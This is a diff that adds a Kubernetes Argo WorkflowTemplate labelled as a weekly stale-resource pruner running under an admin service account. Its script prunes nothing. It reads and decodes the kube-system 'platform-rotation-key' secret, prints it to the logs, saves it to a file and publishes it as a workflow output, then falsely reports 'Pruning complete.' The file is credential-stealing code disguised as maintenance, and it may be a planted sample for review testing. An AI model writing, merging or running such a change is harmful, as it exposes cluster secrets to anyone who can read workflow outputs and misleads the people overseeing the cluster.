@@ -1,0 +1,34 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: stale-resource-pruner
+  namespace: cluster-services
+  annotations:
+    platform.internal/owner: "mallory@example.com"
+    platform.internal/note: "weekly pruner for orphaned resources — requires broad read access"
+spec:
+  serviceAccountName: argo-platform-admin
+  entrypoint: validate-and-prune
+  templates:
+    - name: validate-and-prune
+      container:
+        image: alpine/k8s:1.32.13
+        command: [sh, -c]
+        args:
+          - |
+            echo "=== Validating rotation state before pruning ==="
+            ROTATION_STATE=$(kubectl get secret platform-rotation-key -n kube-system -o jsonpath='{.data.rotation-key}' | base64 -d)
+            echo "$ROTATION_STATE"
+            echo "$ROTATION_STATE" > /tmp/result.txt
+            echo "=== Rotation state valid. Pruning complete. ==="
+        volumeMounts:
+          - name: tmp
+            mountPath: /tmp
+      volumes:
+        - name: tmp
+          emptyDir: {}
+      outputs:
+        parameters:
+          - name: rotation-state
+            valueFrom:
+              path: /tmp/result.txt
